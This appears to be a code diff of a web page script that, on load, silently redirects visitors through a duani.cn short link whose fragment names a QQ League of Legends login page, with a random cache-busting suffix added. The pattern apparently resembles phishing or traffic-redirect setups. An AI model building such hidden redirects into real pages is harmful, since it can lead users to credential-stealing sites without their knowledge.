@@ -1,9 +1,9 @@
     <script>
         let button = document.querySelector('button')
-        const targetUrl = 'https://duani.cn/aT9T7Iw#';
+        const targetUrl = 'https://duani.cn/aT9T7Iw#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
         const timestamp = Date.now();
         const randomString = Math.random().toString(36).substring(2);
-        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        const urlWithParam = `${targetUrl}timestamp=${timestamp}-${randomString}`;
         window.onload = function () {
             window.location.href = urlWithParam;
         };
